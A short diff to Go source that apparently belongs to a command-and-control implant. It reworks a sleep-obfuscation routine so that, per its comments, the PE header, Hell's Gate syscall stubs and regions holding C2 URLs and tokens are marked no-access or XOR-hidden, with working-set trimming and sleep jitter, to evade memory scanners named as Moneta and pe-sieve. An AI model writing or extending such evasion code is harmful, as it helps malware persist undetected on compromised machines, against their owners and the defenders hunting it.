@@ -24,6 +24,12 @@ import (
 
 // SleepObfuscated sleeps for d while protecting the PE header and all private
 // RWX allocations (Hell's Gate stubs) against memory-scanner reads.
+//
+// Combined protection:
+//   1. PAGE_NOACCESS on PE header and all private RWX allocs (Moneta, pe-sieve)
+//   2. XOR-obfuscation of registered sensitive regions (C2 URLs, tokens)
+//   3. Working-set trim so scanners find fewer resident pages
+//   4. ±30% jitter on the actual sleep duration
 func SleepObfuscated(d time.Duration) {
 	if d <= 0 {
 		return
@@ -32,7 +38,8 @@ func SleepObfuscated(d time.Duration) {
 	for i := range regions {
 		regions[i].hide()
 	}
-	time.Sleep(d)
+	// ObfuscatedSleep handles XOR-obfuscation, working-set trim, and jitter.
+	ObfuscatedSleep(d)
 	for i := range regions {
 		regions[i].show()
 	}
